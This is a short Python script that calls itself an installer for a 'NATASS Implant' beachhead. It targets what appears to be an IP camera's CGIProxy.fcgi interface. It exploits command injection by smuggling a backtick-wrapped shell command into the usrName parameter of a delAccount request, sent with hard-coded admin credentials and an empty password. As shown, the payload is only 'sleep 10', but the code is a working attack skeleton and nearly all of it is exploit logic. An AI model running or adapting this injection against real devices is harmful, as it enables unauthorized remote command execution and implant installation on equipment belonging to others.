import requests

class Installer:
    def __init__(self):
        return
    
    def Install(self, connection_information, credentials):
        # Installs our beachhead to the target.
        
        # Connection
        (IP, Port) = connection_information
        self.BaseURL = f'http://{IP}:{Port}/cgi-bin/CGIProxy.fcgi'

        print(f"[+] Installing the NATASS Implant to {IP}:{Port}...")
        response = self.Send("sleep 10", credentials)
        
        print(f'[Response Below]:')
        print(response.text)

        return
    
    def Send(self, cmd, credentials):    
        fmt = "+".join(cmd.split(" "))
        command = f'{self.BaseURL}?usr={credentials["user"]}&pwd={credentials["password"]}&cmd=delAccount&usrName=`{fmt}`&usrPwd=foobar&privilege=2'
        print(f'[D] {command}')
        return requests.get(command)

def main():
    natass_installer = Installer()
    natass_installer.Install(('10.0.1.2', 88), { 'user' : 'admin', 'password' : '' })
    return

if __name__ == "__main__":
    main()

